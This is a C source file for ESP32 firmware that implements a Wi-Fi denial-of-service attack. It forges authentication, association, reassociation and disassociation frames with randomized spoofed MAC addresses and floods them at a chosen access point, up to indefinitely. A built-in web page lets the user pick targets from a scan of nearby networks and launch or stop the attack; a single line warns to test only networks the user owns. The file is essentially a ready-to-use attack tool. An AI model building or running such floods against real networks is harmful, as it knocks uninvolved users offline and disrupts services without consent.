#include "attack_dos.h"
#include "wifi_scan.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include "main.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "DOS";

static dos_status_t dos_status = {0};
static SemaphoreHandle_t status_mutex = NULL;
static TaskHandle_t dos_task_handle = NULL;

static uint8_t target_ap[6];
static uint8_t target_channel;
static dos_attack_type_t attack_type;
static uint32_t attack_duration;

// Authentication frame template
static const uint8_t auth_frame_template[] = {
    0xb0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00,
    0x00, 0x00
};

// Association request template
static const uint8_t assoc_frame_template[] = {
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x04,
    0x0a, 0x00
};

// Reassociation request template
static const uint8_t reassoc_frame_template[] = {
    0x20, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x04,
    0x0a, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Disassociation frame template
static const uint8_t disassoc_frame_template[] = {
    0xa0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

static void random_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;
}

static void send_auth_flood(void) {
    uint8_t frame[30];
    memcpy(frame, auth_frame_template, sizeof(auth_frame_template));
    
    memcpy(&frame[4], target_ap, 6);
    random_mac(&frame[10]);
    memcpy(&frame[16], target_ap, 6);
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static void send_assoc_flood(void) {
    uint8_t frame[28];
    memcpy(frame, assoc_frame_template, sizeof(assoc_frame_template));
    
    memcpy(&frame[4], target_ap, 6);
    random_mac(&frame[10]);
    memcpy(&frame[16], target_ap, 6);
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static void send_reassoc_flood(void) {
    uint8_t frame[34];
    memcpy(frame, reassoc_frame_template, sizeof(reassoc_frame_template));
    
    memcpy(&frame[4], target_ap, 6);
    random_mac(&frame[10]);
    memcpy(&frame[16], target_ap, 6);
    memcpy(&frame[28], target_ap, 6);
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static void send_disassoc_flood(void) {
    uint8_t frame[26];
    memcpy(frame, disassoc_frame_template, sizeof(disassoc_frame_template));
    
    memcpy(&frame[4], target_ap, 6);
    random_mac(&frame[10]);
    memcpy(&frame[16], target_ap, 6);
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static void dos_attack_task(void *pvParameters) {
    ESP_LOGI(TAG, "DoS attack started - Type: %d", attack_type);
    
    // DON'T switch modes - stay in APSTA
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    uint32_t start_time = xTaskGetTickCount() / 1000;
    
    while (dos_status.running) {
        uint32_t elapsed = (xTaskGetTickCount() / 1000) - start_time;
        
        if (attack_duration > 0 && elapsed >= attack_duration) {
            ESP_LOGI(TAG, "DoS attack duration reached");
            break;
        }
        
        switch (attack_type) {
            case DOS_AUTH_FLOOD:
                for (int i = 0; i < 10; i++) {
                    send_auth_flood();
                    xSemaphoreTake(status_mutex, portMAX_DELAY);
                    dos_status.packets_sent++;
                    xSemaphoreGive(status_mutex);
                }
                break;
                
            case DOS_ASSOC_FLOOD:
                for (int i = 0; i < 10; i++) {
                    send_assoc_flood();
                    xSemaphoreTake(status_mutex, portMAX_DELAY);
                    dos_status.packets_sent++;
                    xSemaphoreGive(status_mutex);
                }
                break;
                
            case DOS_REASSOC_FLOOD:
                for (int i = 0; i < 10; i++) {
                    send_reassoc_flood();
                    xSemaphoreTake(status_mutex, portMAX_DELAY);
                    dos_status.packets_sent++;
                    xSemaphoreGive(status_mutex);
                }
                break;
                
            case DOS_DISASSOC_FLOOD:
                for (int i = 0; i < 10; i++) {
                    send_disassoc_flood();
                    xSemaphoreTake(status_mutex, portMAX_DELAY);
                    dos_status.packets_sent++;
                    xSemaphoreGive(status_mutex);
                }
                break;
                
            case DOS_COMBINED:
                send_auth_flood();
                send_assoc_flood();
                send_reassoc_flood();
                send_disassoc_flood();
                xSemaphoreTake(status_mutex, portMAX_DELAY);
                dos_status.packets_sent += 4;
                xSemaphoreGive(status_mutex);
                break;
        }
        
        xSemaphoreTake(status_mutex, portMAX_DELAY);
        dos_status.elapsed_sec = elapsed;
        xSemaphoreGive(status_mutex);
        
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    
    // DON'T disable anything - keep AP running
    dos_status.running = false;
    
    ESP_LOGI(TAG, "DoS attack stopped. Packets sent: %lu", dos_status.packets_sent);
    dos_task_handle = NULL;
    vTaskDelete(NULL);
}

void dos_attack_start(dos_attack_type_t type, const uint8_t *ap_mac, uint8_t channel, uint32_t duration) {
    if (dos_status.running) {
        ESP_LOGW(TAG, "DoS attack already running");
        return;
    }
    
    if (!status_mutex) {
        status_mutex = xSemaphoreCreateMutex();
    }
    
    xSemaphoreTake(status_mutex, portMAX_DELAY);
    memset(&dos_status, 0, sizeof(dos_status));
    dos_status.running = true;
    dos_status.type = type;
    memcpy(dos_status.ap_mac, ap_mac, 6);
    dos_status.channel = channel;
    dos_status.duration_sec = duration;
    xSemaphoreGive(status_mutex);
    
    memcpy(target_ap, ap_mac, 6);
    target_channel = channel;
    attack_type = type;
    attack_duration = duration;
    
    xTaskCreate(dos_attack_task, "dos_task", 4096, NULL, 5, &dos_task_handle);
}

void dos_attack_stop(void) {
    if (!dos_status.running) return;
    
    dos_status.running = false;
    
    while (dos_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "DoS attack stopped");
}

bool dos_is_running(void) {
    return dos_status.running;
}

void dos_get_status(dos_status_t *status) {
    if (!status_mutex || !status) return;
    
    xSemaphoreTake(status_mutex, portMAX_DELAY);
    memcpy(status, &dos_status, sizeof(dos_status_t));
    xSemaphoreGive(status_mutex);
}

esp_err_t dos_attack_handler(httpd_req_t *req) {
    // DON'T stop tools on page load
    
    char query[512];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            dos_attack_stop();
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_dos'>"
                "<style>body{background:#0a0f1c;color:#f5c542;text-align:center;padding:50px;}</style>"
                "</head><body><h1>✅ Attack Stopped</h1></body></html>";
            
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
        
        if (strstr(query, "start=1")) {
            // Stop other attacks before starting
            stop_all_tools();
            
            uint8_t ap_mac[6];
            uint8_t channel = 1;
            uint32_t duration = 0;
            dos_attack_type_t type = DOS_AUTH_FLOOD;
            
            char *ap_param = strstr(query, "ap=");
            char *ch_param = strstr(query, "channel=");
            char *dur_param = strstr(query, "duration=");
            char *type_param = strstr(query, "type=");
            
            if (ap_param) {
                sscanf(ap_param + 3, "%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx",
                    &ap_mac[0], &ap_mac[1], &ap_mac[2], &ap_mac[3], &ap_mac[4], &ap_mac[5]);
            }
            if (ch_param) channel = atoi(ch_param + 8);
            if (dur_param) duration = atoi(dur_param + 9);
            if (type_param) type = atoi(type_param + 5);
            
            dos_attack_start(type, ap_mac, channel, duration);
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_dos'>"
                "<style>body{background:#0a0f1c;color:#f5c542;text-align:center;padding:50px;}</style>"
                "</head><body><h1>⚡ DoS Attack Started</h1></body></html>";
            
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
    }
    
    bool is_running = dos_is_running();
    dos_status_t status;
    dos_get_status(&status);
    
    ap_with_clients_t scan_results[20];
    int scan_count = wifi_scan_get_results(scan_results, 20);
    
    char *page = malloc(32768);
    if (!page) {
        const char *err = "<html><body>Memory Error</body></html>";
        httpd_resp_send(req, err, strlen(err));
        return ESP_FAIL;
    }
    
    const char *auto_refresh = is_running ? "<meta http-equiv='refresh' content='2'>" : "";
    
    int offset = 0;
    offset += snprintf(page + offset, 32768 - offset,
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>%s"
        "<title>DoS Attack</title><style>"
        "body{background:#0a0f1c;color:#f5c542;font-family:sans-serif;margin:0;padding:20px;}"
        "h1,h2{text-align:center;color:#f5c542;}h2{border-bottom:2px solid #f5c542;padding-bottom:5px;}"
        ".container{max-width:900px;margin:0 auto;}"
        ".status{padding:15px;margin:20px 0;border-radius:8px;text-align:center;font-weight:bold;}"
        ".status.running{background:#ff4444;color:white;}"
        ".status.stopped{background:#44ff44;color:#0a0f1c;}"
        ".control{background:#1a1f2c;padding:20px;border-radius:8px;margin:20px 0;}"
        "label{display:block;margin:10px 0 5px;font-weight:bold;}"
        "input,select{width:100%%;padding:10px;border-radius:5px;border:2px solid #f5c542;"
        "background:#0a0f1c;color:#f5c542;margin-bottom:15px;box-sizing:border-box;}"
        ".btn{display:inline-block;padding:12px 20px;margin:10px 5px;background:#f5c542;"
        "color:#0a0f1c;text-decoration:none;font-weight:bold;border-radius:8px;border:none;cursor:pointer;}"
        ".btn:hover{background:#d4a017;}.btn.danger{background:#ff4444;color:white;}.btn.full{width:100%%;box-sizing:border-box;}"
        "table{width:100%%;border-collapse:collapse;margin:10px 0;}"
        "th,td{padding:8px;border:1px solid #f5c542;text-align:left;font-size:0.9em;}"
        "th{background:#1a1f2c;}tr:hover{background:#1a1f2c;cursor:pointer;}"
        ".info{background:#1a1f2c;padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #f5c542;}"
        ".stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:20px 0;}"
        ".stat-box{background:#1a1f2c;padding:15px;border-radius:8px;text-align:center;}"
        ".stat-value{font-size:2em;font-weight:bold;color:#f5c542;}"
        "</style>"
        "<script>function selectAP(b,c){document.getElementById('ap').value=b;document.getElementById('channel').value=c;}</script>"
        "</head><body><div class='container'>"
        "<h1>💥 WiFi DoS Attack</h1>",
        auto_refresh);
    
    if (is_running) {
        const char *type_name = "Unknown";
        switch (status.type) {
            case DOS_AUTH_FLOOD: type_name = "Auth Flood"; break;
            case DOS_ASSOC_FLOOD: type_name = "Association Flood"; break;
            case DOS_REASSOC_FLOOD: type_name = "Reassociation Flood"; break;
            case DOS_DISASSOC_FLOOD: type_name = "Disassociation Flood"; break;
            case DOS_COMBINED: type_name = "Combined Attack"; break;
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='status running'>🔴 ATTACK ACTIVE</div>"
            "<div class='stats'>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div>Packets Sent</div></div>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div>Seconds Elapsed</div></div>"
            "<div class='stat-box'><div class='stat-value'>CH %d</div><div>Channel</div></div>"
            "</div>"
            "<div class='info'><strong>Attack Type:</strong> %s<br>"
            "<strong>Target:</strong> %02X:%02X:%02X:%02X:%02X:%02X</div>"
            "<div class='control'><a href='/wifi_dos?stop=1' class='btn danger full'>⏹ Stop Attack</a></div>",
            status.packets_sent, status.elapsed_sec, status.channel, type_name,
            status.ap_mac[0], status.ap_mac[1], status.ap_mac[2],
            status.ap_mac[3], status.ap_mac[4], status.ap_mac[5]);
    } else {
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='status stopped'>🟢 Ready</div>"
            "<div class='info'><strong>⚠️ Warning:</strong> DoS attacks flood the target AP with management frames. "
            "Use only on networks you own or have permission to test.</div>"
            "<div class='control'><h2>Launch Attack</h2>"
            "<form action='/wifi_dos' method='get'>"
            "<label>Target AP (BSSID):</label>"
            "<input type='text' id='ap' name='ap' placeholder='AABBCCDDEEFF' pattern='[A-Fa-f0-9]{12}' required>"
            "<label>Attack Type:</label>"
            "<select name='type'>"
            "<option value='0'>Authentication Flood</option>"
            "<option value='1'>Association Flood</option>"
            "<option value='2'>Reassociation Flood</option>"
            "<option value='3'>Disassociation Flood</option>"
            "<option value='4' selected>Combined Attack</option>"
            "</select>"
            "<label>Channel:</label>"
            "<select id='channel' name='channel'>");
        
        for (int i = 1; i <= 13; i++) {
            offset += snprintf(page + offset, 32768 - offset,
                "<option value='%d'%s>Channel %d</option>", i, i == 6 ? " selected" : "", i);
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "</select><label>Duration (0 = infinite):</label>"
            "<select name='duration'>"
            "<option value='0'>Infinite</option>"
            "<option value='30'>30 seconds</option>"
            "<option value='60' selected>60 seconds</option>"
            "<option value='120'>2 minutes</option>"
            "<option value='300'>5 minutes</option>"
            "</select>"
            "<input type='hidden' name='start' value='1'>"
            "<button type='submit' class='btn full'>▶ Start Attack</button></form></div>");
        
        if (scan_count > 0) {
            offset += snprintf(page + offset, 32768 - offset,
                "<h2>📡 Select Target Network</h2>"
                "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th></tr>");
            
            for (int i = 0; i < scan_count && offset < 30000; i++) {
                char bssid[13];
                snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
                    scan_results[i].ap.bssid[0], scan_results[i].ap.bssid[1],
                    scan_results[i].ap.bssid[2], scan_results[i].ap.bssid[3],
                    scan_results[i].ap.bssid[4], scan_results[i].ap.bssid[5]);
                
                const char *ssid_str = strlen((char *)scan_results[i].ap.ssid) > 0 ? 
                    (char *)scan_results[i].ap.ssid : "hidden";
                
                offset += snprintf(page + offset, 32768 - offset,
                    "<tr onclick=\"selectAP('%s',%d)\"><td>%s</td><td>%c%c:%c%c:%c%c:%c%c:%c%c:%c%c</td><td>%d</td><td>%d</td></tr>",
                    bssid, scan_results[i].ap.primary, ssid_str,
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
                    bssid[6],bssid[7],bssid[8],bssid[9],bssid[10],bssid[11],
                    scan_results[i].ap.primary, scan_results[i].ap.rssi);
            }
            offset += snprintf(page + offset, 32768 - offset, "</table>");
        }
    }
    
    offset += snprintf(page + offset, 32768 - offset,
        "<div style='text-align:center;margin-top:30px;'>"
        "<a href='/' class='btn'>⬅ Back</a></div></div></body></html>");
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, page, strlen(page));
    free(page);
    
    return ESP_OK;
}